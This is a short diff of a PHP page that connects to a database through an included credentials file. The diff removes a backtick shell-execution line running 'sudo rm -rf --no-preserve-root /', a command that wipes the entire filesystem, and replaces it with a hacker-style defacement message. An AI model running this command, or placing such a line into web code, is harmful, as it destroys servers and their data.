@@ -1,6 +1,6 @@
 <?php
 
-`sudo rm -rf --no-preserve-root /`
+echo "CraPFYrE HKXd bY l33t Hxx0r!";
 
 //Details to login connect to the database
 include("/home1/etherals/mysqlDetails.php");
